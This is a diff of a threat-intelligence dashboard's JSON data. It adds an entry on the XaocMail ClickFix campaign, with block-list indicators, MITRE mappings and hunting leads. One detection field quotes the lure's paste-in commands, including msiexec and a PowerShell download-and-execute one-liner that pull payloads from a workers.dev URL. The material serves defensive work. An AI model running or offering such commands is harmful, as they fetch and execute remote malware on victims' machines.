@@ -4,10 +4,10 @@
  "repository": "https://github.com/daniyyell-dev/rapid-threat-intel",
  "documentation": "https://github.com/daniyyell-dev/rapid-threat-intel/blob/main/docs/dashboard.md",
  "licence": "MIT",
- "last_updated": "2026-11-13 11:40",
- "threat_count": 50,
- "indicator_count": 1478,
- "block_now_count": 659,
+ "last_updated": "2026-11-13 14:18",
+ "threat_count": 51,
+ "indicator_count": 1528,
+ "block_now_count": 706,
  "combined_files": [
   {
    "name": "block_now.txt",
@@ -111,7 +111,7 @@
    "published": "2026-11-11",
    "entry_date": "2026-11-13 11:40",
    "last_updated": "2026-11-13",
-   "seq": 50,
+   "seq": 51,
    "headline": "Old Qlik Sense flaws exploited at EU firms for PowerShell reverse shells, a Go agent and SSH-key persistence",
    "summary": "Cynet reports that in October 2026 the Qlik Sense Scheduler.exe process on servers at several EU customers launched cmd.exe and a hidden, base64-encoded PowerShell reverse shell, all within about three minutes. The process tree matches the 2023 Cactus ransomware intrusions, so the operator most likely used the old Qlik Sense flaws CVE-2023-41266 with CVE-2023-41265, or CVE-2023-48365 (DoubleQlik). The shell is a trimmed Nishang one-liner that checks in to 45.115.26.23 over HTTP at /hb and connects back on TCP 4455. An open directory on the same server (TCP 8012) held a Go reverse-shell agent (wsvc.exe, TCP 4456) for Windows and several Linux architectures, a Bash agent (TCP 4457), a persist.ps1 script that installs OpenSSH, adds the ed25519 key node6-sm to administrators_authorized_keys, writes C:\\ProgramData\\ssh\\winc.ps1 and creates the WinUpdCheck task every five minutes, plus ActiveMQ CVE-2023-46604 payloads and a modified Veeam CVE-2024-40711 toolchain still in testing. The server address and the two persist.ps1 hashes are on the block list.",
    "caveat": "Cynet did not confirm which Qlik Sense vulnerability was used. The ActiveMQ and Veeam tooling looked unfinished and Cynet saw no successful exploitation with it. OpenSSH-Win64.zip on the staging server was the legitimate package, so it is not listed.",
@@ -462,7 +462,7 @@
    "published": "2026-11-09",
    "entry_date": "2026-11-13 11:40",
    "last_updated": "2026-11-13",
-   "seq": 49,
+   "seq": 50,
    "headline": "Stolen Qubole vendor credentials used to assume customer AWS integration roles, steal secrets and download S3 data",
    "summary": "Wiz, working with Sentra and Mandiant, reports that between 14 and 26 October 2026 a threat actor used IAM credentials from AWS account 805246085872, which Qubole's data platform uses to reach customer accounts, to assume the cross-account integration roles that dozens of customers had created to trust Qubole. Every AssumeRole call carried a valid External ID and succeeded, and most of the roles were otherwise unused. Using session names starting quiam-, the actor enumerated S3, EC2, RDS, IAM and KMS, read Lambda environment variables, Secrets Manager secrets and SSM parameters, downloaded whole S3 buckets, and validated the credentials it found with TruffleHog against AWS, Entra ID and Okta. Traffic came from an OVH server (57.129.54.120, which also hosted a bootable sso_agent.iso that beacons to TCP 23458) and Mullvad VPN exits. An actor calling itself n0n has claimed the intrusion. The OVH address and the ISO hashes are on the block list; the Mullvad exits, the vendor account and its principal IDs are alert-only hunt leads.",
    "caveat": "Account 805246085872 and the principal AIDAJYRRH5Y3A7AAJM2HW also carry legitimate Qubole traffic from AWS infrastructure; alert on them only when the source address is not an AWS address. AIDA3W7DIFLYOLTK63SFS was seen only in attacker activity. The Mullvad addresses are shared VPN exits and are not blocked. 57.129.54.120 was attacker-controlled from 15 to 26 October 2026 and may be reassigned later. The user agents Wiz lists are common and are only useful alongside another indicator.",
@@ -900,7 +900,7 @@
    "published": "2026-11-12",
    "entry_date": "2026-11-13 11:25",
    "last_updated": "2026-11-13",
-   "seq": 48,
+   "seq": 49,
    "headline": "A public exploit gives root on clustered Cisco Expressway nodes through hard-coded Erlang credentials on TCP 4372",
    "summary": "Cisco fixed CVE-2026-76466 (CVSS 9.8) on 21 October 2026: clustered Cisco Expressway-C and Expressway-E nodes, virtual and appliance, on X15.5.3 and earlier (and X14 and earlier) let an unauthenticated attacker run operating-system commands as root through the cluster database service. On 12 November researcher Nicolas Krassas (dinosn) published a working exploit and fleet detector on GitHub. It opens TLS to TCP 4372, completes the Erlang distribution handshake as the hard-coded maintenance node wombat@127.0.0.1 with the hard-coded cookie that is the same on every affected install, and calls os:cmd as root; it was tested on Expressway-C X15.3.2 in the factory-default TLS Permissive mode. Cisco says there is no workaround and, at the time of its advisory, knew of no malicious use; no exploitation has been reported since the code went public. No attacker infrastructure exists yet, so this entry is hunt and alert only. Its hunts flag connections to TCP 4371 or 4372 from anything that is not a cluster peer, and the public exploit being run from a managed host.",
    "caveat": "No exploitation or attacker indicators have been published; the CVE row is a tracking identifier, not something to block. The network hunt needs your Expressway cluster peer addresses filled in before it alerts, and it only sees traffic your firewall or NetFlow logs record. Expressway nodes do not run Defender for Endpoint, so the KQL can only see managed devices that connect out to the cluster ports or run the exploit.",
@@ -1097,6 +1097,1440 @@
      "name": "hunt.yaral",
      "url": "https://raw.githubusercontent.com/daniyyell-dev/rapid-threat-intel/main/threats/2026-11_November-2026/2026-11-13/Cisco-Expressway-CVE-2026-76466-Public-Root-RCE-PoC/hunt.yaral",
      "download": "Cisco-Expressway-CVE-2026-76466-Public-Root-RCE-PoC_hunt.yaral"
+    }
+   ]
+  },
+  {
+   "id": "XaocMail-ClickFix-Phantom53-DoH-C2-Havoc",
+   "folder": "threats/2026-11_November-2026/2026-11-13/XaocMail-ClickFix-Phantom53-DoH-C2-Havoc",
+   "name": "XaocMail ClickFix Campaign Dropping Phantom53 DoH C2 and Havoc",
+   "short": "XaocMail Phantom53",
+   "category": "Malware / RAT",
+   "published": "2026-11-13",
+   "entry_date": "2026-11-13 14:18",
+   "last_updated": "2026-11-13",
+   "seq": 48,
+   "headline": "A Russian-speaking actor uses ClickFix document lures to install Phantom53, a DNS-over-HTTPS backdoor that loads Havoc",
+   "summary": "SOCRadar's Threat Research Unit, writing on 13 November 2026, describes an active campaign by a Russian-speaking actor running since August 2026. XaocMail, a self-hosted phishing platform, sends personalised document-sharing emails from likely compromised mailboxes, linking to Cloudflare Worker ClickFix pages (securedoc subdomains on workers.dev). The victim pastes a Win+R command that runs an MSI (msiexec /i ... /qn), HTA or PowerShell payload. The MSI drops a private Python runtime in a random AppData folder and two scheduled tasks that run pythonw.exe: the Phantom53 beacon, which hides command and control in DNS-over-HTTPS AAAA answers from Cloudflare, Google and ControlD resolvers, and a watcher that loads a Havoc Demon in memory for chosen targets. Almost a thousand lures hit Latin America, Asia and Europe across technology, finance, education, government, logistics and manufacturing. Attacker servers, domains, the exfiltration URL and all malware hashes are on the block list.",
+   "caveat": "All indicators come from one SOCRadar report; the actor is unnamed. 176.9.154.69 looks like a shared Hetzner proxy and the two GitHub URLs are abused paths on github.com, so those are alert only and github.com, workers.dev and the public DoH resolvers must never be blocked. Block each workers.dev host exactly as listed.",
+   "targets": {
+    "countries": [
+     {
+      "code": "BR",
+      "name": "Brazil"
+     },
+     {
+      "code": "PE",
+      "name": "Peru"
+     },
+     {
+      "code": "IN",
+      "name": "India"
+     },
+     {
+      "code": "ID",
+      "name": "Indonesia"
+     },
+     {
+      "code": "ES",
+      "name": "Spain"
+     }
+    ],
+    "regions": [
+     "Latin America",
+     "Asia",
+     "Europe"
+    ],
+    "sectors": [
+     "Technology and IT",
+     "Finance",
+     "Education",
+     "Government",
+     "Logistics",
+     "Manufacturing"
+    ],
+    "note": "SOCRadar found almost a thousand personalised XaocMail lure pages, mostly aimed at Brazil and Peru, then India, Indonesia and Spain, spread evenly across sectors with a slight tilt toward technology and IT.",
+    "source": {
+     "url": "https://socradar.io/blog/xaocmail-clickfix-phantom53-havox-america-asia-europe/",
+     "label": "SOCRadar Threat Research Unit – XaocMail ClickFix Campaign Drops Phantom53 and HavoX Across Latin America, Asia, and Europe",
+     "name": "SOCRadar"
+    }
+   },
+   "mitre": [
+    {
+     "id": "T1566.002",
+     "name": "Spearphishing Link",
+     "url": "https://attack.mitre.org/techniques/T1566/002/"
+    },
+    {
+     "id": "T1204.004",
+     "name": "Malicious Copy and Paste",
+     "url": "https://attack.mitre.org/techniques/T1204/004/"
+    },
+    {
+     "id": "T1218.007",
+     "name": "Msiexec",
+     "url": "https://attack.mitre.org/techniques/T1218/007/"
+    },
+    {
+     "id": "T1218.005",
+     "name": "Mshta",
+     "url": "https://attack.mitre.org/techniques/T1218/005/"
+    },
+    {
+     "id": "T1059.001",
+     "name": "PowerShell",
+     "url": "https://attack.mitre.org/techniques/T1059/001/"
+    },
+    {
+     "id": "T1053.005",
+     "name": "Scheduled Task",
+     "url": "https://attack.mitre.org/techniques/T1053/005/"
+    },
+    {
+     "id": "T1574.002",
+     "name": "DLL Side-Loading",
+     "url": "https://attack.mitre.org/techniques/T1574/002/"
+    },
+    {
+     "id": "T1071.004",
+     "name": "DNS",
+     "url": "https://attack.mitre.org/techniques/T1071/004/"
+    },
+    {
+     "id": "T1572",
+     "name": "Protocol Tunneling",
+     "url": "https://attack.mitre.org/techniques/T1572/"
+    },
+    {
+     "id": "T1568.002",
+     "name": "Domain Generation Algorithms",
+     "url": "https://attack.mitre.org/techniques/T1568/002/"
+    },
+    {
+     "id": "T1620",
+     "name": "Reflective Code Loading",
+     "url": "https://attack.mitre.org/techniques/T1620/"
+    },
+    {
+     "id": "T1090",
+     "name": "Proxy",
+     "url": "https://attack.mitre.org/techniques/T1090/"
+    }
+   ],
+   "recommended_actions": [
+    "Block the attacker IPs, domains (each workers.dev host exactly as listed), the exfiltration URL on 145.63.138.67:8125 and all Phantom53 and Havoc hashes, and search 90 days of proxy, DNS, firewall and EDR logs for them.",
+    "Alert on msiexec, mshta or PowerShell launched from the Run dialog with a workers.dev URL ending in /m?id=, /h?id= or /s?id=; isolate any host that hits.",
+    "Hunt scheduled tasks that run pythonw.exe with a .pyw script from AppData, the files p53_task_a.xml or p53_task_b.xml, and pythonw.exe in AppData talking to DoH resolvers.",
+    "On a confirmed host, remove both tasks and the random AppData Python folder, check HKCU\\Software\\Classes\\CLSID for the beacon's state key, and reset the user's passwords and sessions.",
+    "Reduce ClickFix risk: restrict the Run dialog and msiexec from URLs for standard users, and warn staff about paste-this-command pages behind document-sharing emails."
+   ],
+   "sources": [
+    {
+     "url": "https://socradar.io/blog/xaocmail-clickfix-phantom53-havox-america-asia-europe/",
+     "label": "SOCRadar Threat Research Unit – XaocMail ClickFix Campaign Drops Phantom53 and HavoX Across Latin America, Asia, and Europe",
+     "name": "SOCRadar"
+    },
+    {
+     "url": "https://threatfox.abuse.ch/ioc/1980891/",
+     "label": "ThreatFox – 94.156.152.7 tracked as Remcos C2 (IOC 1980891)",
+     "name": "ThreatFox"
+    },
+    {
+     "url": "https://threatfox.abuse.ch/ioc/2027546/",
+     "label": "threatfox.abuse.ch",
+     "name": "ThreatFox (2)"
+    },
+    {
+     "url": "https://threatfox.abuse.ch/ioc/2027547/",
+     "label": "threatfox.abuse.ch",
+     "name": "ThreatFox (3)"
+    },
+    {
+     "url": "https://threatfox.abuse.ch/ioc/2027548/",
+     "label": "threatfox.abuse.ch",
+     "name": "ThreatFox (4)"
+    },
+    {
+     "url": "https://threatfox.abuse.ch/ioc/2027549/",
+     "label": "threatfox.abuse.ch",
+     "name": "ThreatFox (5)"
+    },
+    {
+     "url": "https://threatfox.abuse.ch/ioc/2027550/",
+     "label": "threatfox.abuse.ch",
+     "name": "ThreatFox (6)"
+    },
+    {
+     "url": "https://threatfox.abuse.ch/ioc/2027551/",
+     "label": "threatfox.abuse.ch",
+     "name": "ThreatFox (7)"
+    },
+    {
+     "url": "https://threatfox.abuse.ch/ioc/2027552/",
+     "label": "threatfox.abuse.ch",
+     "name": "ThreatFox (8)"
+    },
+    {
+     "url": "https://threatfox.abuse.ch/ioc/2027553/",
+     "label": "threatfox.abuse.ch",
+     "name": "ThreatFox (9)"
+    },
+    {
+     "url": "https://threatfox.abuse.ch/ioc/2027554/",
+     "label": "threatfox.abuse.ch",
+     "name": "ThreatFox (10)"
+    },
+    {
+     "url": "https://threatfox.abuse.ch/ioc/2027555/",
+     "label": "threatfox.abuse.ch",
+     "name": "ThreatFox (11)"
+    },
+    {
+     "url": "https://threatfox.abuse.ch/ioc/2027556/",
+     "label": "threatfox.abuse.ch",
+     "name": "ThreatFox (12)"
+    },
+    {
+     "url": "https://threatfox.abuse.ch/ioc/2027557/",
+     "label": "threatfox.abuse.ch",
+     "name": "ThreatFox (13)"
+    },
+    {
+     "url": "https://threatfox.abuse.ch/ioc/2027558/",
+     "label": "threatfox.abuse.ch",
+     "name": "ThreatFox (14)"
+    },
+    {
+     "url": "https://threatfox.abuse.ch/ioc/2027559/",
+     "label": "threatfox.abuse.ch",
+     "name": "ThreatFox (15)"
+    },
+    {
+     "url": "https://threatfox.abuse.ch/ioc/2027560/",
+     "label": "threatfox.abuse.ch",
+     "name": "ThreatFox (16)"
+    },
+    {
+     "url": "https://threatfox.abuse.ch/ioc/2027561/",
+     "label": "threatfox.abuse.ch",
+     "name": "ThreatFox (17)"
+    },
+    {
+     "url": "https://threatfox.abuse.ch/ioc/2027562/",
+     "label": "threatfox.abuse.ch",
+     "name": "ThreatFox (18)"
+    },
+    {
+     "url": "https://threatfox.abuse.ch/ioc/2027563/",
+     "label": "threatfox.abuse.ch",
+     "name": "ThreatFox (19)"
+    },
+    {
+     "url": "https://bazaar.abuse.ch/sample/bceeb2d54b6a756c73a3e06617e9e95ad4d8e53da47639bcd6ef3cae98c6da6d/",
+     "label": "bazaar.abuse.ch",
+     "name": "MalwareBazaar"
+    },
+    {
+     "url": "https://bazaar.abuse.ch/sample/79a4cb73983a1facb5db09f1a20cec6e58d91a93044a78aa3ba32ab2190284ed/",
+     "label": "bazaar.abuse.ch",
+     "name": "MalwareBazaar (2)"
+    },
+    {
+     "url": "https://bazaar.abuse.ch/sample/0e1c94a8f94158f64558325ddbfd1e1277884fba6fb1f8c381dbd5c742e59fbb/",
+     "label": "bazaar.abuse.ch",
+     "name": "MalwareBazaar (3)"
+    },
+    {
+     "url": "https://bazaar.abuse.ch/sample/efc4b8c1968c06e598a6f6f98398d44b488198b497291fe30fb792d696b6cb81/",
+     "label": "bazaar.abuse.ch",
+     "name": "MalwareBazaar (4)"
+    },
+    {
+     "url": "https://bazaar.abuse.ch/sample/4f656834e545c0b44922ce6d8952989c8c0859d8ae8b1f117c06ab07b047e2b4/",
+     "label": "bazaar.abuse.ch",
+     "name": "MalwareBazaar (5)"
+    },
+    {
+     "url": "https://bazaar.abuse.ch/sample/8ebb2bf61b48ae7abdcd674413bebd79b30ddd945854e175ba60d56c0a3adf54/",
+     "label": "bazaar.abuse.ch",
+     "name": "MalwareBazaar (6)"
+    },
+    {
+     "url": "https://bazaar.abuse.ch/sample/56582934901cce0b618d6a50e54c9db29bf2d444636bcd40b5975a765ecde538/",
+     "label": "bazaar.abuse.ch",
+     "name": "MalwareBazaar (7)"
+    },
+    {
+     "url": "https://bazaar.abuse.ch/sample/009099ba10365b44bdb3ecc28dfcbed6a594ec0a0df86931620cdaac9843e611/",
+     "label": "bazaar.abuse.ch",
+     "name": "MalwareBazaar (8)"
+    },
+    {
+     "url": "https://bazaar.abuse.ch/sample/0aff424f9a02eb9f429119c4caa05e85fc952603549d69849e745293d20235d6/",
+     "label": "bazaar.abuse.ch",
+     "name": "MalwareBazaar (9)"
+    },
+    {
+     "url": "https://bazaar.abuse.ch/sample/7055483a77f679ad569c3a9bfe76cdb8e5b96efc44d2bf2a6f08e930add598b0/",
+     "label": "bazaar.abuse.ch",
+     "name": "MalwareBazaar (10)"
+    },
+    {
+     "url": "https://bazaar.abuse.ch/sample/0dcfe51d2521e52a469f5cec6b42bc8e7e37b41df993cce7d739ff3fd248d8b1/",
+     "label": "bazaar.abuse.ch",
+     "name": "MalwareBazaar (11)"
+    },
+    {
+     "url": "https://bazaar.abuse.ch/sample/bd1c005f35e4fd8c61dfa6f20d4c03e082c692e286a3b22dd642369c8d5e3564/",
+     "label": "bazaar.abuse.ch",
+     "name": "MalwareBazaar (12)"
+    },
+    {
+     "url": "https://bazaar.abuse.ch/sample/dbd252becd490ac47e16bff4391ab9e6237c4f7e81ab6784c57fa2eed751f477/",
+     "label": "bazaar.abuse.ch",
+     "name": "MalwareBazaar (13)"
+    },
+    {
+     "url": "https://bazaar.abuse.ch/sample/e9e57a57ee45b8faae2e47affd8cf3a6d0cc1283802108f7298ae1d2ef3b43f0/",
+     "label": "bazaar.abuse.ch",
+     "name": "MalwareBazaar (14)"
+    },
+    {
+     "url": "https://bazaar.abuse.ch/sample/d2d41b249905deae3bd6bcaa547872d747256a7dfa459b509d9db9de8f0ca29b/",
+     "label": "bazaar.abuse.ch",
+     "name": "MalwareBazaar (15)"
+    },
+    {
+     "url": "https://bazaar.abuse.ch/sample/ee5fa33b58d0f2772e091e23de9db24908d970000a88e39fd7d908f30f5e591a/",
+     "label": "bazaar.abuse.ch",
+     "name": "MalwareBazaar (16)"
+    },
+    {
+     "url": "https://bazaar.abuse.ch/sample/a972797cc1a4161f6e2841142b8cace9b781585f9a71b03aa79a9c051b817491/",
+     "label": "bazaar.abuse.ch",
+     "name": "MalwareBazaar (17)"
+    },
+    {
+     "url": "https://bazaar.abuse.ch/sample/47e853092511d9663196e9b36d563a0c3e92ee734f88675c4f375ffcfa5f3db8/",
+     "label": "bazaar.abuse.ch",
+     "name": "MalwareBazaar (18)"
+    },
+    {
+     "url": "https://bazaar.abuse.ch/sample/4efe003a54db8ffbaef6065270eacb0a59479ccc86941517ac7a33344e97bc1d/",
+     "label": "bazaar.abuse.ch",
+     "name": "MalwareBazaar (19)"
+    },
+    {
+     "url": "https://bazaar.abuse.ch/sample/9a2af4b6d9780e08c86ff35030ee1747ea11460cb1dffc868c48e7af6d626546/",
+     "label": "bazaar.abuse.ch",
+     "name": "MalwareBazaar (20)"
+    }
+   ],
+   "indicator_count": 50,
+   "block_now_count": 47,
+   "hunt_count": 3,
+   "hunt_counts": {
+    "alert": 3
+   },
+   "indicator_counts": {
+    "sha256": 22,
+    "domain": 18,
+    "ipv4": 7,
+    "url": 3
+   },
+   "ioas": [
+    {
+     "artefact": "msiexec, mshta or PowerShell started from the Run dialog (explorer.exe) with a workers.dev URL ending in /m?id=, /h?id= or /s?id=, or the reversed 'xei' Invoke-Expression trick",
+     "log_source": "Defender XDR DeviceProcessEvents; EDR process events",
+     "why": "The XaocMail ClickFix page tells the victim to paste a command into Win+R: msiexec /i https://securedoc.[name].workers.dev/m?id=[id] /qn (the current, preferred mode), mshta https://.../h?id=, or powershell .(-join'xei'[-1..-3])((New-Object Net.WebClient).DownloadString('https://.../s?id=')). Tuning: parent must be explorer.exe, the child msiexec, mshta, powershell or pwsh, and the command line must carry a workers.dev URL with one of the three payload paths and an id= parameter, or the reversed xei string. Expected false positives: very rare; legitimate installers are not launched by hand from a workers.dev URL. Treat any hit as initial access.",
+     "action": "alert",
+     "has_query": true,
+     "source_url": "https://socradar.io/blog/xaocmail-clickfix-phantom53-havox-america-asia-europe/",
+     "source_name": "SOCRadar",
+     "title": "ClickFix Run-dialog msiexec, mshta or PowerShell from workers.dev",
+     "queries": [
+      "KQL",
+      "SPL",
+      "YARA-L"
+     ]
+    },
+    {
+     "artefact": "A scheduled task that runs pythonw.exe with a .pyw script from a randomly named folder under AppData",
+     "log_source": "Defender XDR DeviceEvents (ScheduledTaskCreated); Windows Security 4698; Task Scheduler operational log",
+     "why": "The Phantom53 MSI drops a private Python 3.11 runtime into a random folder under %LOCALAPPDATA%, %APPDATA%, %APPDATA%\\Microsoft or %LOCALAPPDATA%\\Microsoft\\WindowsApps and registers two tasks that run [folder]\\pythonw.exe [random].pyw every 12 minutes (beacon) and every 3 minutes (watcher). Task names come from a pool: MicrosoftEdgeUpdateTask, OneDriveSyncTask, WindowsDefenderScheduledScan, OfficeBackgroundTaskHandler or AdobeAcrobatUpdateTask followed by one random character. Tuning: the task action must contain pythonw.exe and a .pyw file under AppData; standard Python installs (\\Programs\\Python\\, Microsoft Store PythonSoftwareFoundation, Anaconda or Miniconda) are excluded. Expected false positives: a developer's own scheduled Python script run from a portable or venv folder in AppData; a task name from the pool with a pythonw.exe action is close to certain.",
+     "action": "alert",
+     "has_query": true,
+     "source_url": "https://socradar.io/blog/xaocmail-clickfix-phantom53-havox-america-asia-europe/",
+     "source_name": "SOCRadar",
+     "title": "Scheduled task running pythonw.exe from AppData",
+     "queries": [
+      "KQL"
+     ]
+    },
+    {
+     "artefact": "Files p53_task_a.xml or p53_task_b.xml written to the user's temp folder",
+     "log_source": "Defender XDR DeviceFileEvents; EDR file events",
+     "why": "When it is not elevated, Phantom53 writes %TEMP%\\p53_task_a.xml and p53_task_b.xml and registers them with Register-ScheduledTask, which raises a UAC prompt showing a fake product name such as Node.js Runtime from OpenJS Foundation. The file names are specific to this malware. Expected false positives: none known.",
+     "action": "alert",
+     "has_query": true,
+     "source_url": "https://socradar.io/blog/xaocmail-clickfix-phantom53-havox-america-asia-europe/",
+     "source_name": "SOCRadar",
+     "title": "p53_task_a.xml or p53_task_b.xml written",
+     "queries": [
+      "KQL",
+      "SPL",
+      "YARA-L"
+     ]
+    },
+    {
+     "artefact": "pythonw.exe running from a user AppData folder making DNS-over-HTTPS requests to public resolvers by IP or by dns.google",
+     "log_source": "Defender XDR DeviceNetworkEvents; EDR network events; proxy logs",
+     "why": "The Phantom53 beacon hides its command and control in DNS AAAA answers fetched by DoH POST to 1.1.1.1, 1.0.0.1, 8.8.8.8, 8.8.4.4, 76.76.2.11 or 76.76.10.11 on port 443, falling back to SNI hosts such as dns.google and then to plain UDP 53. Tuning: the process must be pythonw.exe under AppData, outside standard Python installs (\\Programs\\Python\\, PythonSoftwareFoundation, Anaconda, Miniconda). Expected false positives: a Python tool in a user profile that uses a DoH library; browsers and the OS resolver are not pythonw.exe. Do not block the resolvers; hunt the process.",
+     "action": "hunt",
+     "has_query": true,
+     "source_url": "https://socradar.io/blog/xaocmail-clickfix-phantom53-havox-america-asia-europe/",
+     "source_name": "SOCRadar",
+     "title": "pythonw.exe in AppData using DoH resolvers",
+     "queries": [
+      "KQL"
+     ]
+    }
+   ],
+   "ioa_count": 4,
+   "ioa_note": "Behaviours are leads, not confirmed indicators, and can match legitimate activity. Compare any hit against your own baseline and environment before acting.",
+   "files": [
+    {
+     "name": "block_now.txt",
+     "label": "Block list",
+     "url": "https://raw.githubusercontent.com/daniyyell-dev/rapid-threat-intel/main/threats/2026-11_November-2026/2026-11-13/XaocMail-ClickFix-Phantom53-DoH-C2-Havoc/block_now.txt",
+     "download": "XaocMail-ClickFix-Phantom53-DoH-C2-Havoc_block_now.txt"
+    },
+    {
+     "name": "defender_xdr_indicators.csv",
+     "label": "Defender XDR import",
+     "url": "https://raw.githubusercontent.com/daniyyell-dev/rapid-threat-intel/main/threats/2026-11_November-2026/2026-11-13/XaocMail-ClickFix-Phantom53-DoH-C2-Havoc/defender_xdr_indicators.csv",
+     "download": "XaocMail-ClickFix-Phantom53-DoH-C2-Havoc_defender_xdr_indicators.csv"
+    },
+    {
+     "name": "hunt.kql",
+     "label": "Hunting query (KQL)",
+     "url": "https://raw.githubusercontent.com/daniyyell-dev/rapid-threat-intel/main/threats/2026-11_November-2026/2026-11-13/XaocMail-ClickFix-Phantom53-DoH-C2-Havoc/hunt.kql",
+     "download": "XaocMail-ClickFix-Phantom53-DoH-C2-Havoc_hunt.kql"
+    },
+    {
+     "name": "hunt.spl",
+     "label": "Hunting query (SPL)",
+     "url": "https://raw.githubusercontent.com/daniyyell-dev/rapid-threat-intel/main/threats/2026-11_November-2026/2026-11-13/XaocMail-ClickFix-Phantom53-DoH-C2-Havoc/hunt.spl",
+     "download": "XaocMail-ClickFix-Phantom53-DoH-C2-Havoc_hunt.spl"
+    },
+    {
+     "name": "hunt_raw.spl",
+     "label": "Hunting query (SPL, raw events)",
+     "note": "hunt_raw.spl, for data not mapped to CIM",
+     "url": "https://raw.githubusercontent.com/daniyyell-dev/rapid-threat-intel/main/threats/2026-11_November-2026/2026-11-13/XaocMail-ClickFix-Phantom53-DoH-C2-Havoc/hunt_raw.spl",
+     "download": "XaocMail-ClickFix-Phantom53-DoH-C2-Havoc_hunt_raw.spl"
+    },
+    {
+     "name": "hunt.yaral",
+     "label": "Hunting query (YARA-L 2.0)",
+     "url": "https://raw.githubusercontent.com/daniyyell-dev/rapid-threat-intel/main/threats/2026-11_November-2026/2026-11-13/XaocMail-ClickFix-Phantom53-DoH-C2-Havoc/hunt.yaral",
+     "download": "XaocMail-ClickFix-Phantom53-DoH-C2-Havoc_hunt.yaral"
+    },
+    {
+     "name": "iocs.csv",
+     "label": "All indicators (CSV)",
+     "url": "https://raw.githubusercontent.com/daniyyell-dev/rapid-threat-intel/main/threats/2026-11_November-2026/2026-11-13/XaocMail-ClickFix-Phantom53-DoH-C2-Havoc/iocs.csv",
+     "download": "XaocMail-ClickFix-Phantom53-DoH-C2-Havoc_iocs.csv"
+    }
+   ],
+   "repo_url": "https://github.com/daniyyell-dev/rapid-threat-intel/tree/main/threats/2026-11_November-2026/2026-11-13/XaocMail-ClickFix-Phantom53-DoH-C2-Havoc",
+   "share_url": "https://daniyyell.com/rapid-threat-intel/t/XaocMail-ClickFix-Phantom53-DoH-C2-Havoc/",
+   "indicators": [
+    {
+     "value": "185.224.132.148",
+     "type": "ipv4",
+     "confidence": "high",
+     "recommended_action": "block",
+     "description": "XaocMail phishing server: landing pages on TCP 8585, the FastAPI back end on HTTP 5000 and the actor's DNS server on UDP 53 that answers Phantom53 DoH queries.",
+     "source_url": "https://socradar.io/blog/xaocmail-clickfix-phantom53-havox-america-asia-europe/",
+     "source_label": "SOCRadar Threat Research Unit – XaocMail ClickFix Campaign Drops Phantom53 and HavoX Across Latin America, Asia, and Europe",
+     "source_name": "SOCRadar",
+     "sources": [
+      {
+       "url": "https://socradar.io/blog/xaocmail-clickfix-phantom53-havox-america-asia-europe/",
+       "name": "SOCRadar"
+      }
+     ]
+    },
+    {
+     "value": "162.252.198.204",
+     "type": "ipv4",
+     "confidence": "high",
+     "recommended_action": "block",
+     "description": "Operator OPS server with SSH on TCP 2222.",
+     "source_url": "https://socradar.io/blog/xaocmail-clickfix-phantom53-havox-america-asia-europe/",
+     "source_label": "SOCRadar Threat Research Unit – XaocMail ClickFix Campaign Drops Phantom53 and HavoX Across Latin America, Asia, and Europe",
+     "source_name": "SOCRadar",
+     "sources": [
+      {
+       "url": "https://socradar.io/blog/xaocmail-clickfix-phantom53-havox-america-asia-europe/",
+       "name": "SOCRadar"
+      }
+     ]
+    },
+    {
+     "value": "162.252.199.92",
+     "type": "ipv4",
+     "confidence": "high",
+     "recommended_action": "block",
+     "description": "Operator OPS server running a Ligolo-ng tunnel.",
+     "source_url": "https://socradar.io/blog/xaocmail-clickfix-phantom53-havox-america-asia-europe/",
+     "source_label": "SOCRadar Threat Research Unit – XaocMail ClickFix Campaign Drops Phantom53 and HavoX Across Latin America, Asia, and Europe",
+     "source_name": "SOCRadar",
+     "sources": [
+      {
+       "url": "https://socradar.io/blog/xaocmail-clickfix-phantom53-havox-america-asia-europe/",
+       "name": "SOCRadar"
+      }
+     ]
+    },
+    {
+     "value": "94.156.152.7",
+     "type": "ipv4",
+     "confidence": "high",
+     "recommended_action": "block",
+     "description": "Operator VPS used in the XaocMail and Phantom53 operation.",
+     "source_url": "https://socradar.io/blog/xaocmail-clickfix-phantom53-havox-america-asia-europe/",
+     "source_label": "SOCRadar Threat Research Unit – XaocMail ClickFix Campaign Drops Phantom53 and HavoX Across Latin America, Asia, and Europe",
+     "source_name": "SOCRadar",
+     "sources": [
+      {
+       "url": "https://socradar.io/blog/xaocmail-clickfix-phantom53-havox-america-asia-europe/",
+       "name": "SOCRadar"
+      },
+      {
+       "url": "https://threatfox.abuse.ch/ioc/1980891/",
+       "name": "ThreatFox"
+      }
+     ]
+    },
+    {
+     "value": "145.63.138.67",
+     "type": "ipv4",
+     "confidence": "high",
+     "recommended_action": "block",
+     "description": "Havoc (HavoX) team server and login panel on TCP 8000, XaocMail statistics on TCP 8081 and the exfiltration endpoint /up/ on TCP 8125.",
+     "source_url": "https://socradar.io/blog/xaocmail-clickfix-phantom53-havox-america-asia-europe/",
+     "source_label": "SOCRadar Threat Research Unit – XaocMail ClickFix Campaign Drops Phantom53 and HavoX Across Latin America, Asia, and Europe",
+     "source_name": "SOCRadar",
+     "sources": [
+      {
+       "url": "https://socradar.io/blog/xaocmail-clickfix-phantom53-havox-america-asia-europe/",
+       "name": "SOCRadar"
+      }
+     ]
+    },
+    {
+     "value": "91.132.93.251",
+     "type": "ipv4",
+     "confidence": "high",
+     "recommended_action": "block",
+     "description": "RevSocks reverse-proxy server reached over secure WebSockets.",
+     "source_url": "https://socradar.io/blog/xaocmail-clickfix-phantom53-havox-america-asia-europe/",
+     "source_label": "SOCRadar Threat Research Unit – XaocMail ClickFix Campaign Drops Phantom53 and HavoX Across Latin America, Asia, and Europe",
+     "source_name": "SOCRadar",
+     "sources": [
+      {
+       "url": "https://socradar.io/blog/xaocmail-clickfix-phantom53-havox-america-asia-europe/",
+       "name": "SOCRadar"
+      }
+     ]
+    },
+    {
+     "value": "176.9.154.69",
+     "type": "ipv4",
+     "confidence": "med",
+     "recommended_action": "alert",
+     "description": "Proxy the operators used while hunting for credentials.",
+     "source_url": "https://socradar.io/blog/xaocmail-clickfix-phantom53-havox-america-asia-europe/",
+     "source_label": "SOCRadar Threat Research Unit – XaocMail ClickFix Campaign Drops Phantom53 and HavoX Across Latin America, Asia, and Europe",
+     "source_name": "SOCRadar",
+     "sources": [
+      {
+       "url": "https://socradar.io/blog/xaocmail-clickfix-phantom53-havox-america-asia-europe/",
+       "name": "SOCRadar"
+      }
+     ]
+    },
+    {
+     "value": "http://145.63.138.67:8125/up/",
+     "type": "url",
+     "confidence": "high",
+     "recommended_action": "block",
+     "description": "Exfiltration URL on the Havoc server where stolen data is uploaded.",
